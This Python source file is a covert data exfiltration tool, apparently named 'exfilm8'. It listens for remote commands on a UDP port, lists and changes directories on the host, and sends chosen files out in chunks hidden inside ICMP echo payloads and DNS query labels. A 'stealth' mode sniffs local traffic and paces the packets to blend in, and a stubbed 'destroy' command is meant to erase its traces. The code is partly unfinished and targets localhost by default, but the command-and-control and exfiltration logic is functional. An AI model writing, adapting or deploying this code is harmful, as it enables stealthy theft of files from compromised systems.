import argparse
import base64
import binascii
import ctypes
import math
import os
import platform
import random
import socket
import string
import struct
import sys
import threading
import time

from ctypes import *
from sys import argv
from scapy.all import *

u_char      = c_ubyte
u_int       = c_int
u_short     = c_ushort

chunkLength         = 20
currentFilePath     = "secretdoc1.txt"
workingDirectory    = ""
exfilBytes          = b''
ICMP_ECHO_REPLY     = 0
ICMP_ECHO_REQUEST   = 8
intervalLength      = 5
startByte           = 0
updatedPPI          = 10

DNS_REQUEST     = 0
ICMP_PROTOCOL   = socket.getprotobyname('icmp')
UDP_PROTOCOL    = socket.getprotobyname('udp')

# Command line flags
stealthMode = False
fastMode    = False
ppsMode     = (False,0)
icmpOnly    = False
dnsOnly     = False
mixedOnly   = False

monitorThread = None

bindAddress = "127.0.0.1"
dstAddress  = "127.0.0.1"
bindPort    = 1337
dstPort     = 53

receiveSocket   = None
sendICMPSocket  = None
sendDNSSocket   = None

pktCount = 0

class ICMPPacket:
    def __init__(self, type, code, data):
        self.type = type
        self.code = code
        self.data = data

    def computeChecksum():
        pass
    
    def getHeader(self):
        # Type (8), code(8), checksum(16), id(16), sequence(16)
        packetId = int((id(self) * random.random()) % 65535)
        icmpHeader = struct.pack("bbHHh", self.type, self.code, 0, packetId, 0)
        return icmpHeader

    def construct(self):
        header = self.getHeader()
        return header + self.data

class DNSPacket:
    def __init__(self, data):
        self.data = data
        self.QR = 0

    def computeChecksum():
        pass
        
    def getHeader(self, length):
        # ID (16), QR(1), OpCode(4), AA(1), TC(1), RD(1), RA(1), Z(1), RCode(16), QDCount(16), ANCount(16), NSCount(16), ARCount(16)
        # All flags are 0 so we can just use an unsigned short (16 bytes) of 0

        packetId = int((id(self) * random.random()) % 65535)
        dnsHeader = struct.pack("!HHHHHH", packetId, 0, 1, 0, 0, 0)
        return dnsHeader

    def construct(self):
        # Add hostname terminating byte and final two options
        end = struct.pack("HH", socket.htons(1), socket.htons(1))
        length = len(self.data) + len(end) + 20
        header = self.getHeader(length)

        print("Total packet length: %d" % length)
        return header + self.data + end
 
def main():
    init()
    #parseCommand("exfil -f -d secretdoc1.txt")

# callback for received packets
def recv_pkts(data):
    global pktCount

    pktCount += 1

def init():
    global exfilBytes
    global sendICMPSocket
    global sendDNSSocket
    global receiveSocket
    global receiveThread
    global workingDirectory
    global pktCount
    workingDirectory = os.getcwd()

    # TODO: Move socket initialisations into here and handle exceptions
    receiveSocket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    receiveSocket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    receiveSocket.bind((bindAddress, bindPort))

    sendICMPSocket = socket.socket(socket.AF_INET, socket.SOCK_RAW, 1)
    sendDNSSocket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, 17)

    # Start C2 thread
    receiveThread = threading.Thread(None, receiveCommands)
    receiveThread.start()

def zeroCount():
    global pktCount

    pktCount = 0

def receiveCommands():
    while True:
        print("Listening")
        data,addr = receiveSocket.recvfrom(1024)
        print("Received command...")
        command = data[13:-5].decode()
        parseCommand(command)

def parseCommand(cmd):
    global stealthMode
    global fastMode
    global ppsMode
    global icmpOnly
    global dnsOnly
    global mixedOnly
    global currentFilePath
    global workingDirectory

    cmd = cmd.split(' ')
    print("Command: {}".format(cmd))

    if cmd[0] == "remls":
        # Get a list of files in working directory
        try:
            result = os.listdir(workingDirectory)
            output = b''
            for i in range(0, len(result)):
                output += result[i].encode()
                if i != len(result) - 1:
                    output += "\n".encode()
            sendDataLoop(output)
        except Exception as e:
            print(e)

    elif cmd[0] == "remcd":
        print("Setting current directory.")
        # Change working directory to specified path
        # Only supporting absolute paths
        # TODO: relative paths
        workingDirectory = cmd[1]
    elif cmd[0] == "rempwd":
        sendDataLoop(workingDirectory.encode());
    elif cmd[0] == "chmod":
        # TODO: rename this command
        # Parse in same way as below
        pass
    elif cmd[0] == "cancel":
        # Cancel exfiltration
        pass
    elif cmd[0] == "destroy":
        # Cancel exfiltration and remove all trace of exfilm8 from the system
        pass
    elif cmd[0] == "exfil":
        cmd = cmd[1:] # Remove 'exfil' from the start

        parser = argparse.ArgumentParser(description="Set options for exfiltration")
        # TODO: IMPORTANT, add mutually exclusive groups

        # Add send modes
        parser.add_argument('-s', dest="stealth", action="store_true", default=False, required=False)
        parser.add_argument('-f', dest="fast", action="store_true", default=False, required=False)
        parser.add_argument('-p', dest="pps", type=float)

        # Add packet options
        parser.add_argument('-i', dest="icmp", action="store_true", default=False, required=False)
        parser.add_argument('-d', dest="dns", action="store_true", default=False, required=False)
        parser.add_argument('-m', dest="mixed", action="store_true", default=False, required=False)

        # Add file to exfiltrate
        parser.add_argument('file')

        # TODO: Handle errors thrown by parse_args()
        args = parser.parse_args(cmd)

        # Check constraints on arguments (manual mutual exclusivity)
        ret = False

        if args.stealth & args.fast:
            print("Error: -s and -f are mutually exclusive")
            ret = True
        '''if (args.stealth | args.fast) & (args.pps != 0):
            print("Error: -s, -f and -p are mutually exclusive")
            ret = True'''
        if args.icmp & args.dns:
            print("Error: Use -m for ICMP and DNS")
            ret = True
        if (args.icmp | args.dns) & args.mixed:
            print("Error: Use -m without -i or -d")
            ret = True
        if ret:
            # Return after all errors have been printed
            return

        # Set defaults if nothing was provided
        print("args.pps: " + str(args.pps))
        if not(args.stealth | args.fast | bool(args.pps)):
            print("Using default mode: stealth")
            print("args.pss: " + str(args.pps))
            args.stealth = True
        if not(args.icmp | args.dns | args.mixed):
            args.mixed = True

        if args.stealth:  
            # If stealth mode is on then start network monitoring
            monitorThread = threading.Thread(None, monitorNetwork)
            monitorThread.start()

        # Set option variables 
        if args.pps != None:
            ppsMode = (True, args.pps)

        stealthMode = args.stealth
        fastMode    = args.fast
        icmpOnly    = args.icmp
        dnsOnly     = args.dns
        mixedOnly   = args.mixed

        currentFilePath = args.file

        print("Stealth: {}\nFast: {}\nPPS: {}\nICMP: {}\nDNS: {}\nMixed: {}".format(stealthMode, fastMode, ppsMode[0], icmpOnly, dnsOnly, mixedOnly))
        #print("Current file path: {}".format(currentFilePath))
        sendFileLoop()
    else:
        # Command not recognised
        pass

def sendFileLoop():
    global exfilBytes
    global startByte
    global workingDirectory

    # TODO: Change this so we're not using global variables
    # Reset start byte so we're starting at the beginning of new file
    startByte = 0

    if not workingDirectory.endswith("/"):
        workingDirectory += "/"

    try:    
        exfilBytes = readFile(workingDirectory + currentFilePath, "rb")
    except Exception as e:
        print("Error: " + str(e))
        return

    if stealthMode:
        if updatedPPI == 0:
            delay = 100
        else:
            k = 48 # Constant of proporionality between delay and ppi
            localPPI = updatedPPI
            delay = k / localPPI
    elif ppsMode[0]:
        delay = 1/ppsMode[1]

    # While the whole file hasn't be exfiltrated
    while startByte < (len(exfilBytes) - 1):
        # Update delay based on network listener data
        if stealthMode:       
            print("localPPI: %d updatedPPI: %d" % (localPPI, updatedPPI))
            # If the monitor has updated the PPI value, then update the delay between packets
            if localPPI != updatedPPI:
                print("Updating delay")
                if updatedPPI == 0:
                    delay = 100
                else:
                    localPPI = updatedPPI
                    delay = k/localPPI
                print("New delay: %f" % (delay))        

        # Send next chunk
        nextPacketType = getNextPacketType()
        if nextPacketType == ICMP_PROTOCOL:
            print("ICMP packet sent")
            packet = createICMPPacketFromFile()
        elif nextPacketType == UDP_PROTOCOL:
            print("DNS packet sent")
            packet = createDNSPacketFromFile()
            print(packet)
        sendNext(dstAddress, nextPacketType, packet)

        if stealthMode | ppsMode[0]:
            time.sleep(delay)

    sendEndOfTransmission()
    
def sendDataLoop(data):
    global exfilBytes
    global startByte
    global workingDirectory

    startByte = 0
    icmpLength = 200
    dnsLength = 248

    # While the whole data string hasn't be exfiltrated
    while startByte < (len(data) - 1):    
        # Send next chunk
        nextPacketType = getNextPacketType()
        if nextPacketType == ICMP_PROTOCOL:
            print("Sending ICMP packet...")
            packet = createICMPPacketFromData(data[startByte: startByte + icmpLength])
            startByte += icmpLength
        elif nextPacketType == UDP_PROTOCOL:
            print("Sending DNS packet...")
            packet = createDNSPacketFromData(data[startByte: startByte + dnsLength])
            startByte += dnsLength
        sendNext(dstAddress, nextPacketType, packet)

    sendEndOfTransmission()

def getNextPacketType():
    if icmpOnly:
        return ICMP_PROTOCOL
    elif dnsOnly:
        return UDP_PROTOCOL
    else:
        protos = [ICMP_PROTOCOL, UDP_PROTOCOL]
        return protos[math.floor(random.random() * len(protos))]

def createICMPPacketFromFile():
    data = getNextChunk(startByte, chunkLength)
    icmpPacket = ICMPPacket(ICMP_ECHO_REQUEST, 0, data).construct()

    return icmpPacket

def createDNSPacketFromFile():
    queryHostname = b''

    if fastMode == True:
        # (62).(62).(62).(62)
        for i in range(0, 4):
            chunkLength = 62
            data = getNextChunk(startByte, chunkLength)
            #data = base64.b64encode(data)
            data = len(data).to_bytes(1, "big") + data
            queryHostname += data

        queryHostname += (0).to_bytes(1, "big") # Add null terminating byte to domain name
    else:
        # Adjust chunk length accordingly
        for i in range(0, 4):
            chunkLength = math.floor(random.random() * 62) + 1
            data = getNextChunk(startByte, chunkLength)
            #data = base64.b32encode(data)
            data = len(data).to_bytes(1, "big") + data
            queryHostname += data

        queryHostname += (0).to_bytes(1, "big") # Add null terminating byte to domain name

    dnsPacket = DNSPacket(queryHostname).construct()

    return dnsPacket

def createICMPPacketFromData(msg):
    icmpPacket = ICMPPacket(ICMP_ECHO_REQUEST, 0, msg).construct()
    return icmpPacket

def createDNSPacketFromData(msg):
    if len(msg) > 248:
        # TODO: IMPORTANT, consider throwing error instead of truncating, it's not expected behaviour
        # TODO: Add correct exception, e.g. ArgumentOutOfRangeException
        print("Data too long")
        # Truncate output
        msg = msg[:248]

    dataProgress = 0
    queryHostname = b''

    print("Creating DNS packet from data")

    # These packets won't be regular, so no need to randomise label lengths
    # Divide data into four labels, accounting for lengths non divisable by 4    
    if len(msg) % 4 != 0:
        labelSize = int(len(msg) / 3)
        lastLabelSize = int(len(msg) % 3)
    else:
        labelSize = int(len(msg) / 4)
        lastLabelSize = labelSize

    for i in range(0, 4):
        if i == 3:
            data = msg[dataProgress: dataProgress + lastLabelSize]
        else:
            data = msg[dataProgress:dataProgress + labelSize]

        data = len(data).to_bytes(1, "big") + data
        dataProgress += labelSize

        queryHostname += data

    queryHostname += (0).to_bytes(1, "big") # Add null terminating byte to domain name

    dnsPacket = DNSPacket(queryHostname).construct()

    return dnsPacket

def getNextChunk(sb, cl):
    global startByte
    chunk = b''
    
    # TODO: Take bytes as arg to avoid using global variable exfilBytes

    # Check if chunk overlaps end of file
    if (sb + cl) > (len(exfilBytes) - 1):
        # If yes then set the chunk size to the remainder of the file
        chunkLength = len(exfilBytes) - sb

    for i in range(sb, sb + cl):
        chunk += exfilBytes[i:i+1]
    # TODO: Check speed of splicing vs. constructing with a for loop
    #chunk = exfilBytes[sb : sb + cl]
    startByte += cl
    return chunk

def sendStartOfFile():
    pass
    
def roundUp(x, base=4):
    return int(math.ceil(x / base)) * base

def sendEndOfTransmission():
    nextType = getNextPacketType()
    if nextType == ICMP_PROTOCOL:
        print("Sending ICMP EOT")
        content =  ICMPPacket(ICMP_ECHO_REQUEST, 0, b'Completed').construct()
        sendNext(dstAddress, ICMP_PROTOCOL, content)
    elif nextType == UDP_PROTOCOL:
        print("Sending DNS EOT")
        content =  DNSPacket((9).to_bytes(1, "little") + b'Completed'  + (0).to_bytes(1, "little")).construct()
        sendNext(dstAddress, UDP_PROTOCOL, content)
    print("Sent end of transmission")
     
def readFile(name, mode):
    fileBytes = b''
    try:
        f = open(name, mode)

        byte = f.read(1)
        while byte != b'':
            fileBytes += byte
            byte = f.read(1)

        f.close()
    except Exception as e:
        raise e

    return fileBytes

def sendNext(dest_addr, code, packet, timeout=1):
    try:
        host = socket.gethostbyname(dest_addr)
    except socket.gaierror:
        return 
    while packet:
        # The icmp protocol does not use a port, but the function
        # below expects it, so we just give it a dummy port.
        if code == ICMP_PROTOCOL:
            print("Sending ICMP packet")
            sent = sendICMPSocket.sendto(packet, (dest_addr, 0))
        elif code == UDP_PROTOCOL:
            print("Sending DNS packet")
            sent = sendDNSSocket.sendto(packet, (dest_addr, dstPort))
        packet = packet[sent:]

    return

def closeAllSockets():
    try:
        sendICMPSocket.close()
        sendDNSSocket.close()
    except e:
        print(e)

intervalTime = 10
capturing = True
captureLength = 10
timeBetweenListens = 5

def monitorNetwork():
    global capturing
    global updatedPPI
    
    # Start receiving of packets. Sniff on all interfaces
    # while not completedTransfer
    while True:
        print("Starting sniffing for 5 seconds...")
        sniff(prn=recv_pkts, timeout=captureLength)
        print("Received {} packets in {} seconds\n".format(pktCount, captureLength))
        updatedPPI = pktCount
        zeroCount()
        #time.sleep(timeBetweenListens)

if __name__ == "__main__":
    main()